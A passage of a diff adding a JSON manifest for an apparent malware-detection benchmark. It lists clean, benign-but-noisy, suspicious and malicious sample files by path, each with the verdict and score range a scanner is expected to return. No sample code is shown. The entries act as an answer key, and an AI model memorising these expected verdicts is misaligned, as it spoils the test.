+          "min" : 0
+        },
+        "expectedVerdict" : "clean"
+      },
+      "group" : "clean",
+      "metadataPath" : "clean\/python\/clean_python_directory_scan_01.py.json",
+      "relativePath" : "clean\/python\/clean_python_directory_scan_01.py",
+      "sampleID" : "clean_python_directory_scan_01",
+      "sourceKind" : "file",
+      "subtype" : "python"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/clean\/python\/clean_python_log_rotate_01.py",
+      "expectation" : {
+        "expectedScoreRange" : {
+          "max" : 15,
+          "min" : 0
+        },
+        "expectedVerdict" : "clean"
+      },
+      "group" : "clean",
+      "metadataPath" : "clean\/python\/clean_python_log_rotate_01.py.meta.json",
+      "relativePath" : "clean\/python\/clean_python_log_rotate_01.py",
+      "sampleID" : "clean_python_log_rotate_01",
+      "sourceKind" : "file",
+      "subtype" : "python"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/clean\/python\/clean_python_subprocess_safe_01.py",
+      "expectation" : {
+        "expectedScoreRange" : {
+          "max" : 18,
+          "min" : 5
+        },
+        "expectedVerdict" : "clean"
+      },
+      "group" : "clean",
+      "metadataPath" : "clean\/python\/clean_python_subprocess_safe_01.py.json",
+      "relativePath" : "clean\/python\/clean_python_subprocess_safe_01.py",
+      "sampleID" : "clean_python_subprocess_safe_01",
+      "sourceKind" : "file",
+      "subtype" : "python"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/clean\/python\/clean_python_text_summary_01.py",
+      "expectation" : {
+        "expectedScoreRange" : {
+          "max" : 8,
+          "min" : 0
+        },
+        "expectedVerdict" : "clean"
+      },
+      "group" : "clean",
+      "metadataPath" : "clean\/python\/clean_python_text_summary_01.py.json",
+      "relativePath" : "clean\/python\/clean_python_text_summary_01.py",
+      "sampleID" : "clean_python_text_summary_01",
+      "sourceKind" : "file",
+      "subtype" : "python"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/clean\/shell\/clean_shell_backup_01.sh",
+      "expectation" : {
+        "expectedScoreRange" : {
+          "max" : 15,
+          "min" : 0
+        },
+        "expectedVerdict" : "clean"
+      },
+      "group" : "clean",
+      "metadataPath" : "clean\/shell\/clean_shell_backup_01.sh.meta.json",
+      "relativePath" : "clean\/shell\/clean_shell_backup_01.sh",
+      "sampleID" : "clean_shell_backup_01",
+      "sourceKind" : "file",
+      "subtype" : "shell"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/clean\/shell\/clean_shell_backup_02.sh",
+      "expectation" : {
+        "expectedScoreRange" : {
+          "max" : 12,
+          "min" : 0
+        },
+        "expectedVerdict" : "clean"
+      },
+      "group" : "clean",
+      "metadataPath" : "clean\/shell\/clean_shell_backup_02.sh.json",
+      "relativePath" : "clean\/shell\/clean_shell_backup_02.sh",
+      "sampleID" : "clean_shell_backup_02",
+      "sourceKind" : "file",
+      "subtype" : "shell"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/clean\/shell\/clean_shell_log_archive_01.sh",
+      "expectation" : {
+        "expectedScoreRange" : {
+          "max" : 12,
+          "min" : 0
+        },
+        "expectedVerdict" : "clean"
+      },
+      "group" : "clean",
+      "metadataPath" : "clean\/shell\/clean_shell_log_archive_01.sh.json",
+      "relativePath" : "clean\/shell\/clean_shell_log_archive_01.sh",
+      "sampleID" : "clean_shell_log_archive_01",
+      "sourceKind" : "file",
+      "subtype" : "shell"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/clean\/shell\/clean_shell_open_safe_site_01.sh",
+      "expectation" : {
+        "expectedScoreRange" : {
+          "max" : 8,
+          "min" : 0
+        },
+        "expectedVerdict" : "clean"
+      },
+      "group" : "clean",
+      "metadataPath" : "clean\/shell\/clean_shell_open_safe_site_01.sh.json",
+      "relativePath" : "clean\/shell\/clean_shell_open_safe_site_01.sh",
+      "sampleID" : "clean_shell_open_safe_site_01",
+      "sourceKind" : "file",
+      "subtype" : "shell"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/clean\/shell\/clean_shell_write_test_plist_01.sh",
+      "expectation" : {
+        "expectedScoreRange" : {
+          "max" : 14,
+          "min" : 0
+        },
+        "expectedVerdict" : "clean"
+      },
+      "group" : "clean",
+      "metadataPath" : "clean\/shell\/clean_shell_write_test_plist_01.sh.json",
+      "relativePath" : "clean\/shell\/clean_shell_write_test_plist_01.sh",
+      "sampleID" : "clean_shell_write_test_plist_01",
+      "sourceKind" : "file",
+      "subtype" : "shell"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/noisy_benign\/app\/NoisyUtilityFixture_01.app",
+      "expectation" : {
+        "expectedScoreRange" : {
+          "max" : 30,
+          "min" : 12
+        },
+        "expectedVerdict" : "benign_noisy"
+      },
+      "group" : "noisy_benign",
+      "metadataPath" : "noisy_benign\/app\/NoisyUtilityFixture_01.app.json",
+      "relativePath" : "noisy_benign\/app\/NoisyUtilityFixture_01.app",
+      "sampleID" : "noisy_app_bundle_fixture_01",
+      "sourceKind" : "file",
+      "subtype" : "app"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/noisy_benign\/app\/noisy_app_updater_manifest_01.json",
+      "expectation" : {
+        "expectedScoreRange" : {
+          "max" : 38,
+          "min" : 18
+        },
+        "expectedVerdict" : "benign_noisy"
+      },
+      "group" : "noisy_benign",
+      "metadataPath" : "noisy_benign\/app\/noisy_app_updater_manifest_01.json.meta.json",
+      "relativePath" : "noisy_benign\/app\/noisy_app_updater_manifest_01.json",
+      "sampleID" : "noisy_app_updater_manifest_01",
+      "sourceKind" : "file",
+      "subtype" : "app"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/noisy_benign\/applescript\/noisy_applescript_admin_prompt_sim_01.applescript",
+      "expectation" : {
+        "expectedScoreRange" : {
+          "max" : 40,
+          "min" : 18
+        },
+        "expectedVerdict" : "benign_noisy"
+      },
+      "group" : "noisy_benign",
+      "metadataPath" : "noisy_benign\/applescript\/noisy_applescript_admin_prompt_sim_01.applescript.meta.json",
+      "relativePath" : "noisy_benign\/applescript\/noisy_applescript_admin_prompt_sim_01.applescript",
+      "sampleID" : "noisy_applescript_admin_prompt_sim_01",
+      "sourceKind" : "file",
+      "subtype" : "applescript"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/noisy_benign\/applescript\/noisy_applescript_finder_batch_rename_01.applescript",
+      "expectation" : {
+        "expectedScoreRange" : {
+          "max" : 28,
+          "min" : 10
+        },
+        "expectedVerdict" : "benign_noisy"
+      },
+      "group" : "noisy_benign",
+      "metadataPath" : "noisy_benign\/applescript\/noisy_applescript_finder_batch_rename_01.applescript.json",
+      "relativePath" : "noisy_benign\/applescript\/noisy_applescript_finder_batch_rename_01.applescript",
+      "sampleID" : "noisy_applescript_finder_batch_rename_01",
+      "sourceKind" : "file",
+      "subtype" : "applescript"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/noisy_benign\/applescript\/noisy_applescript_terminal_echo_pwd_01.applescript",
+      "expectation" : {
+        "expectedScoreRange" : {
+          "max" : 30,
+          "min" : 12
+        },
+        "expectedVerdict" : "benign_noisy"
+      },
+      "group" : "noisy_benign",
+      "metadataPath" : "noisy_benign\/applescript\/noisy_applescript_terminal_echo_pwd_01.applescript.json",
+      "relativePath" : "noisy_benign\/applescript\/noisy_applescript_terminal_echo_pwd_01.applescript",
+      "sampleID" : "noisy_applescript_terminal_echo_pwd_01",
+      "sourceKind" : "file",
+      "subtype" : "applescript"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/noisy_benign\/js\/noisy_js_child_process_ls_01.js",
+      "expectation" : {
+        "expectedScoreRange" : {
+          "max" : 30,
+          "min" : 12
+        },
+        "expectedVerdict" : "benign_noisy"
+      },
+      "group" : "noisy_benign",
+      "metadataPath" : "noisy_benign\/js\/noisy_js_child_process_ls_01.js.json",
+      "relativePath" : "noisy_benign\/js\/noisy_js_child_process_ls_01.js",
+      "sampleID" : "noisy_js_child_process_ls_01",
+      "sourceKind" : "file",
+      "subtype" : "js"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/noisy_benign\/js\/noisy_js_eval_math_only_01.js",
+      "expectation" : {
+        "expectedScoreRange" : {
+          "max" : 35,
+          "min" : 15
+        },
+        "expectedVerdict" : "benign_noisy"
+      },
+      "group" : "noisy_benign",
+      "metadataPath" : "noisy_benign\/js\/noisy_js_eval_math_only_01.js.json",
+      "relativePath" : "noisy_benign\/js\/noisy_js_eval_math_only_01.js",
+      "sampleID" : "noisy_js_eval_math_only_01",
+      "sourceKind" : "file",
+      "subtype" : "js"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/noisy_benign\/js\/noisy_js_network_cache_text_01.js",
+      "expectation" : {
+        "expectedScoreRange" : {
+          "max" : 32,
+          "min" : 14
+        },
+        "expectedVerdict" : "benign_noisy"
+      },
+      "group" : "noisy_benign",
+      "metadataPath" : "noisy_benign\/js\/noisy_js_network_cache_text_01.js.json",
+      "relativePath" : "noisy_benign\/js\/noisy_js_network_cache_text_01.js",
+      "sampleID" : "noisy_js_network_cache_text_01",
+      "sourceKind" : "file",
+      "subtype" : "js"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/noisy_benign\/js\/noisy_js_postinstall_sim_01.js",
+      "expectation" : {
+        "expectedScoreRange" : {
+          "max" : 42,
+          "min" : 20
+        },
+        "expectedVerdict" : "benign_noisy"
+      },
+      "group" : "noisy_benign",
+      "metadataPath" : "noisy_benign\/js\/noisy_js_postinstall_sim_01.js.meta.json",
+      "relativePath" : "noisy_benign\/js\/noisy_js_postinstall_sim_01.js",
+      "sampleID" : "noisy_js_postinstall_sim_01",
+      "sourceKind" : "file",
+      "subtype" : "js"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/noisy_benign\/pkg\/noisy_pkg_fixture_02",
+      "expectation" : {
+        "expectedScoreRange" : {
+          "max" : 35,
+          "min" : 15
+        },
+        "expectedVerdict" : "benign_noisy"
+      },
+      "group" : "noisy_benign",
+      "metadataPath" : "noisy_benign\/pkg\/noisy_pkg_fixture_02.json",
+      "relativePath" : "noisy_benign\/pkg\/noisy_pkg_fixture_02",
+      "sampleID" : "noisy_pkg_fixture_02",
+      "sourceKind" : "file",
+      "subtype" : "pkg"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/noisy_benign\/pkg\/noisy_pkg_preinstall_sim_01.sh",
+      "expectation" : {
+        "expectedScoreRange" : {
+          "max" : 48,
+          "min" : 22
+        },
+        "expectedVerdict" : "benign_noisy"
+      },
+      "group" : "noisy_benign",
+      "metadataPath" : "noisy_benign\/pkg\/noisy_pkg_preinstall_sim_01.sh.meta.json",
+      "relativePath" : "noisy_benign\/pkg\/noisy_pkg_preinstall_sim_01.sh",
+      "sampleID" : "noisy_pkg_preinstall_sim_01",
+      "sourceKind" : "file",
+      "subtype" : "pkg"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/noisy_benign\/python\/noisy_python_build_subprocess_01.py",
+      "expectation" : {
+        "expectedScoreRange" : {
+          "max" : 28,
+          "min" : 12
+        },
+        "expectedVerdict" : "benign_noisy"
+      },
+      "group" : "noisy_benign",
+      "metadataPath" : "noisy_benign\/python\/noisy_python_build_subprocess_01.py.json",
+      "relativePath" : "noisy_benign\/python\/noisy_python_build_subprocess_01.py",
+      "sampleID" : "noisy_python_build_subprocess_01",
+      "sourceKind" : "file",
+      "subtype" : "python"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/noisy_benign\/python\/noisy_python_dynamic_loader_sim_01.py",
+      "expectation" : {
+        "expectedScoreRange" : {
+          "max" : 35,
+          "min" : 16
+        },
+        "expectedVerdict" : "benign_noisy"
+      },
+      "group" : "noisy_benign",
+      "metadataPath" : "noisy_benign\/python\/noisy_python_dynamic_loader_sim_01.py.json",
+      "relativePath" : "noisy_benign\/python\/noisy_python_dynamic_loader_sim_01.py",
+      "sampleID" : "noisy_python_dynamic_loader_sim_01",
+      "sourceKind" : "file",
+      "subtype" : "python"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/noisy_benign\/python\/noisy_python_remote_text_api_01.py",
+      "expectation" : {
+        "expectedScoreRange" : {
+          "max" : 32,
+          "min" : 14
+        },
+        "expectedVerdict" : "benign_noisy"
+      },
+      "group" : "noisy_benign",
+      "metadataPath" : "noisy_benign\/python\/noisy_python_remote_text_api_01.py.json",
+      "relativePath" : "noisy_benign\/python\/noisy_python_remote_text_api_01.py",
+      "sampleID" : "noisy_python_remote_text_api_01",
+      "sourceKind" : "file",
+      "subtype" : "python"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/noisy_benign\/python\/noisy_python_tempfile_cleanup_01.py",
+      "expectation" : {
+        "expectedScoreRange" : {
+          "max" : 24,
+          "min" : 10
+        },
+        "expectedVerdict" : "benign_noisy"
+      },
+      "group" : "noisy_benign",
+      "metadataPath" : "noisy_benign\/python\/noisy_python_tempfile_cleanup_01.py.json",
+      "relativePath" : "noisy_benign\/python\/noisy_python_tempfile_cleanup_01.py",
+      "sampleID" : "noisy_python_tempfile_cleanup_01",
+      "sourceKind" : "file",
+      "subtype" : "python"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/noisy_benign\/python\/noisy_python_updater_01.py",
+      "expectation" : {
+        "expectedScoreRange" : {
+          "max" : 45,
+          "min" : 20
+        },
+        "expectedVerdict" : "benign_noisy"
+      },
+      "group" : "noisy_benign",
+      "metadataPath" : "noisy_benign\/python\/noisy_python_updater_01.py.meta.json",
+      "relativePath" : "noisy_benign\/python\/noisy_python_updater_01.py",
+      "sampleID" : "noisy_python_updater_01",
+      "sourceKind" : "file",
+      "subtype" : "python"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/noisy_benign\/shell\/noisy_shell_appsupport_style_write_01.sh",
+      "expectation" : {
+        "expectedScoreRange" : {
+          "max" : 24,
+          "min" : 10
+        },
+        "expectedVerdict" : "benign_noisy"
+      },
+      "group" : "noisy_benign",
+      "metadataPath" : "noisy_benign\/shell\/noisy_shell_appsupport_style_write_01.sh.json",
+      "relativePath" : "noisy_benign\/shell\/noisy_shell_appsupport_style_write_01.sh",
+      "sampleID" : "noisy_shell_appsupport_style_write_01",
+      "sourceKind" : "file",
+      "subtype" : "shell"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/noisy_benign\/shell\/noisy_shell_base64_config_01.sh",
+      "expectation" : {
+        "expectedScoreRange" : {
+          "max" : 30,
+          "min" : 12
+        },
+        "expectedVerdict" : "benign_noisy"
+      },
+      "group" : "noisy_benign",
+      "metadataPath" : "noisy_benign\/shell\/noisy_shell_base64_config_01.sh.json",
+      "relativePath" : "noisy_benign\/shell\/noisy_shell_base64_config_01.sh",
+      "sampleID" : "noisy_shell_base64_config_01",
+      "sourceKind" : "file",
+      "subtype" : "shell"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/noisy_benign\/shell\/noisy_shell_chmod_tool_01.sh",
+      "expectation" : {
+        "expectedScoreRange" : {
+          "max" : 26,
+          "min" : 10
+        },
+        "expectedVerdict" : "benign_noisy"
+      },
+      "group" : "noisy_benign",
+      "metadataPath" : "noisy_benign\/shell\/noisy_shell_chmod_tool_01.sh.json",
+      "relativePath" : "noisy_benign\/shell\/noisy_shell_chmod_tool_01.sh",
+      "sampleID" : "noisy_shell_chmod_tool_01",
+      "sourceKind" : "file",
+      "subtype" : "shell"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/noisy_benign\/shell\/noisy_shell_installer_like_01.sh",
+      "expectation" : {
+        "expectedScoreRange" : {
+          "max" : 45,
+          "min" : 20
+        },
+        "expectedVerdict" : "benign_noisy"
+      },
+      "group" : "noisy_benign",
+      "metadataPath" : "noisy_benign\/shell\/noisy_shell_installer_like_01.sh.meta.json",
+      "relativePath" : "noisy_benign\/shell\/noisy_shell_installer_like_01.sh",
+      "sampleID" : "noisy_shell_installer_like_01",
+      "sourceKind" : "file",
+      "subtype" : "shell"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/noisy_benign\/shell\/noisy_shell_update_checker_02.sh",
+      "expectation" : {
+        "expectedScoreRange" : {
+          "max" : 30,
+          "min" : 12
+        },
+        "expectedVerdict" : "benign_noisy"
+      },
+      "group" : "noisy_benign",
+      "metadataPath" : "noisy_benign\/shell\/noisy_shell_update_checker_02.sh.json",
+      "relativePath" : "noisy_benign\/shell\/noisy_shell_update_checker_02.sh",
+      "sampleID" : "noisy_shell_update_checker_02",
+      "sourceKind" : "file",
+      "subtype" : "shell"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/replay\/clean\/replay_clean_app_lifecycle_02.json",
+      "group" : "replay_clean",
+      "relativePath" : "replay\/clean\/replay_clean_app_lifecycle_02.json",
+      "sampleID" : "replay_clean_app_lifecycle_02",
+      "sourceKind" : "replayJSON",
+      "subtype" : "jsonReplay"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/replay\/clean\/replay_clean_backup_flow_01.json",
+      "expectation" : {
+        "expectedScoreRange" : {
+          "max" : 15,
+          "min" : 0
+        },
+        "expectedVerdict" : "clean"
+      },
+      "group" : "replay_clean",
+      "metadataPath" : "replay\/clean\/replay_clean_backup_flow_01.json.meta.json",
+      "relativePath" : "replay\/clean\/replay_clean_backup_flow_01.json",
+      "sampleID" : "replay_clean_backup_flow_01",
+      "sourceKind" : "replayJSON",
+      "subtype" : "replay_json"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/replay\/clean\/replay_clean_js_fetch_cache_02.json",
+      "group" : "replay_clean",
+      "relativePath" : "replay\/clean\/replay_clean_js_fetch_cache_02.json",
+      "sampleID" : "replay_clean_js_fetch_cache_02",
+      "sourceKind" : "replayJSON",
+      "subtype" : "jsonReplay"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/replay\/clean\/replay_clean_pkg_appsupport_install_02.json",
+      "group" : "replay_clean",
+      "relativePath" : "replay\/clean\/replay_clean_pkg_appsupport_install_02.json",
+      "sampleID" : "replay_clean_pkg_appsupport_install_02",
+      "sourceKind" : "replayJSON",
+      "subtype" : "jsonReplay"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/replay\/clean\/replay_clean_python_scan_report_02.json",
+      "group" : "replay_clean",
+      "relativePath" : "replay\/clean\/replay_clean_python_scan_report_02.json",
+      "sampleID" : "replay_clean_python_scan_report_02",
+      "sourceKind" : "replayJSON",
+      "subtype" : "jsonReplay"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/replay\/malicious\/replay_malicious_app_bash_curl_persist_02.json",
+      "group" : "replay_malicious",
+      "relativePath" : "replay\/malicious\/replay_malicious_app_bash_curl_persist_02.json",
+      "sampleID" : "replay_malicious_app_bash_curl_persist_02",
+      "sourceKind" : "replayJSON",
+      "subtype" : "jsonReplay"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/replay\/malicious\/replay_malicious_app_osascript_chain_02.json",
+      "group" : "replay_malicious",
+      "relativePath" : "replay\/malicious\/replay_malicious_app_osascript_chain_02.json",
+      "sampleID" : "replay_malicious_app_osascript_chain_02",
+      "sourceKind" : "replayJSON",
+      "subtype" : "jsonReplay"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/replay\/malicious\/replay_malicious_chain_01.json",
+      "expectation" : {
+        "expectedScoreRange" : {
+          "max" : 100,
+          "min" : 85
+        },
+        "expectedVerdict" : "malicious"
+      },
+      "group" : "replay_malicious",
+      "metadataPath" : "replay\/malicious\/replay_malicious_chain_01.json.meta.json",
+      "relativePath" : "replay\/malicious\/replay_malicious_chain_01.json",
+      "sampleID" : "replay_malicious_chain_01",
+      "sourceKind" : "replayJSON",
+      "subtype" : "replay_json"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/replay\/malicious\/replay_malicious_pkg_postinstall_multiegres_02.json",
+      "group" : "replay_malicious",
+      "relativePath" : "replay\/malicious\/replay_malicious_pkg_postinstall_multiegres_02.json",
+      "sampleID" : "replay_malicious_pkg_postinstall_multiegres_02",
+      "sourceKind" : "replayJSON",
+      "subtype" : "jsonReplay"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/replay\/malicious\/replay_malicious_python_subprocess_priv_02.json",
+      "group" : "replay_malicious",
+      "relativePath" : "replay\/malicious\/replay_malicious_python_subprocess_priv_02.json",
+      "sampleID" : "replay_malicious_python_subprocess_priv_02",
+      "sourceKind" : "replayJSON",
+      "subtype" : "jsonReplay"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/replay\/suspicious\/replay_suspicious_app_shell_egress_02.json",
+      "group" : "replay_suspicious",
+      "relativePath" : "replay\/suspicious\/replay_suspicious_app_shell_egress_02.json",
+      "sampleID" : "replay_suspicious_app_shell_egress_02",
+      "sourceKind" : "replayJSON",
+      "subtype" : "jsonReplay"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/replay\/suspicious\/replay_suspicious_persistence_attempt_01.json",
+      "expectation" : {
+        "expectedScoreRange" : {
+          "max" : 80,
+          "min" : 60
+        },
+        "expectedVerdict" : "suspicious"
+      },
+      "group" : "replay_suspicious",
+      "metadataPath" : "replay\/suspicious\/replay_suspicious_persistence_attempt_01.json.meta.json",
+      "relativePath" : "replay\/suspicious\/replay_suspicious_persistence_attempt_01.json",
+      "sampleID" : "replay_suspicious_persistence_attempt_01",
+      "sourceKind" : "replayJSON",
+      "subtype" : "replay_json"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/replay\/suspicious\/replay_suspicious_pkg_persistence_mirror_02.json",
+      "group" : "replay_suspicious",
+      "relativePath" : "replay\/suspicious\/replay_suspicious_pkg_persistence_mirror_02.json",
+      "sampleID" : "replay_suspicious_pkg_persistence_mirror_02",
+      "sourceKind" : "replayJSON",
+      "subtype" : "jsonReplay"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/replay\/suspicious\/replay_suspicious_python_decode_plist_mirror_02.json",
+      "group" : "replay_suspicious",
+      "relativePath" : "replay\/suspicious\/replay_suspicious_python_decode_plist_mirror_02.json",
+      "sampleID" : "replay_suspicious_python_decode_plist_mirror_02",
+      "sourceKind" : "replayJSON",
+      "subtype" : "jsonReplay"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/replay\/suspicious\/replay_suspicious_shell_fanout_tmp_egress_02.json",
+      "group" : "replay_suspicious",
+      "relativePath" : "replay\/suspicious\/replay_suspicious_shell_fanout_tmp_egress_02.json",
+      "sampleID" : "replay_suspicious_shell_fanout_tmp_egress_02",
+      "sourceKind" : "replayJSON",
+      "subtype" : "jsonReplay"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/applescript\/suspicious_applescript_auth_lure_prompt_02.applescript",
+      "expectation" : {
+        "expectedScoreRange" : {
+          "max" : 52,
+          "min" : 35
+        },
+        "expectedVerdict" : "suspicious"
+      },
+      "group" : "suspicious",
+      "metadataPath" : "suspicious\/applescript\/suspicious_applescript_auth_lure_prompt_02.applescript.json",
+      "relativePath" : "suspicious\/applescript\/suspicious_applescript_auth_lure_prompt_02.applescript",
+      "sampleID" : "suspicious_applescript_auth_lure_prompt_02",
+      "sourceKind" : "file",
+      "subtype" : "applescript"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/applescript\/suspicious_applescript_doshell_echo_02.applescript",
+      "expectation" : {
+        "expectedScoreRange" : {
+          "max" : 72,
+          "min" : 55
+        },
+        "expectedVerdict" : "suspicious"
+      },
+      "group" : "suspicious",
+      "metadataPath" : "suspicious\/applescript\/suspicious_applescript_doshell_echo_02.applescript.json",
+      "relativePath" : "suspicious\/applescript\/suspicious_applescript_doshell_echo_02.applescript",
+      "sampleID" : "suspicious_applescript_doshell_echo_02",
+      "sourceKind" : "file",
+      "subtype" : "applescript"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/applescript\/suspicious_applescript_keystroke_sim_01.applescript",
+      "expectation" : {
+        "expectedScoreRange" : {
+          "max" : 78,
+          "min" : 58
+        },
+        "expectedVerdict" : "suspicious"
+      },
+      "group" : "suspicious",
+      "metadataPath" : "suspicious\/applescript\/suspicious_applescript_keystroke_sim_01.applescript.meta.json",
+      "relativePath" : "suspicious\/applescript\/suspicious_applescript_keystroke_sim_01.applescript",
+      "sampleID" : "suspicious_applescript_keystroke_sim_01",
+      "sourceKind" : "file",
+      "subtype" : "applescript"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/applescript\/suspicious_applescript_system_settings_text_02.applescript",
+      "expectation" : {
+        "expectedScoreRange" : {
+          "max" : 50,
+          "min" : 35
+        },
+        "expectedVerdict" : "suspicious"
+      },
+      "group" : "suspicious",
+      "metadataPath" : "suspicious\/applescript\/suspicious_applescript_system_settings_text_02.applescript.json",
+      "relativePath" : "suspicious\/applescript\/suspicious_applescript_system_settings_text_02.applescript",
+      "sampleID" : "suspicious_applescript_system_settings_text_02",
+      "sourceKind" : "file",
+      "subtype" : "applescript"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/applescript\/suspicious_applescript_terminal_download_print_02.applescript",
+      "expectation" : {
+        "expectedScoreRange" : {
+          "max" : 70,
+          "min" : 52
+        },
+        "expectedVerdict" : "suspicious"
+      },
+      "group" : "suspicious",
+      "metadataPath" : "suspicious\/applescript\/suspicious_applescript_terminal_download_print_02.applescript.json",
+      "relativePath" : "suspicious\/applescript\/suspicious_applescript_terminal_download_print_02.applescript",
+      "sampleID" : "suspicious_applescript_terminal_download_print_02",
+      "sourceKind" : "file",
+      "subtype" : "applescript"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/hybrid\/SyntheticSuspiciousFixture_02.app",
+      "expectation" : {
+        "expectedScoreRange" : {
+          "max" : 78,
+          "min" : 60
+        },
+        "expectedVerdict" : "suspicious"
+      },
+      "group" : "suspicious",
+      "metadataPath" : "suspicious\/hybrid\/SyntheticSuspiciousFixture_02.app.json",
+      "relativePath" : "suspicious\/hybrid\/SyntheticSuspiciousFixture_02.app",
+      "sampleID" : "suspicious_hybrid_app_bundle_fixture_02",
+      "sourceKind" : "file",
+      "subtype" : "hybrid_app"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/hybrid\/suspicious_hybrid_chain_sim_01.json",
+      "expectation" : {
+        "expectedScoreRange" : {
+          "max" : 88,
+          "min" : 65
+        },
+        "expectedVerdict" : "suspicious"
+      },
+      "group" : "suspicious",
+      "metadataPath" : "suspicious\/hybrid\/suspicious_hybrid_chain_sim_01.json.meta.json",
+      "relativePath" : "suspicious\/hybrid\/suspicious_hybrid_chain_sim_01.json",
+      "sampleID" : "suspicious_hybrid_chain_sim_01",
+      "sourceKind" : "file",
+      "subtype" : "hybrid"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/hybrid\/suspicious_hybrid_dmg_mirror_fixture_02",
+      "expectation" : {
+        "expectedScoreRange" : {
+          "max" : 80,
+          "min" : 70
+        },
+        "expectedVerdict" : "malicious"
+      },
+      "group" : "suspicious",
+      "metadataPath" : "suspicious\/hybrid\/suspicious_hybrid_dmg_mirror_fixture_02.json",
+      "relativePath" : "suspicious\/hybrid\/suspicious_hybrid_dmg_mirror_fixture_02",
+      "sampleID" : "suspicious_hybrid_dmg_mirror_fixture_02",
+      "sourceKind" : "file",
+      "subtype" : "hybrid_dmg"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/hybrid\/suspicious_hybrid_pkg_fixture_02",
+      "expectation" : {
+        "expectedScoreRange" : {
+          "max" : 80,
+          "min" : 68
+        },
+        "expectedVerdict" : "malicious"
+      },
+      "group" : "suspicious",
+      "metadataPath" : "suspicious\/hybrid\/suspicious_hybrid_pkg_fixture_02.json",
+      "relativePath" : "suspicious\/hybrid\/suspicious_hybrid_pkg_fixture_02",
+      "sampleID" : "suspicious_hybrid_pkg_fixture_02",
+      "sourceKind" : "file",
+      "subtype" : "hybrid_pkg"
+    },
+    {
+      "absolutePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/suspicious\/js\/suspicious_js_buffer_obfuscation_sim_02.js",
+      "expectation" : {
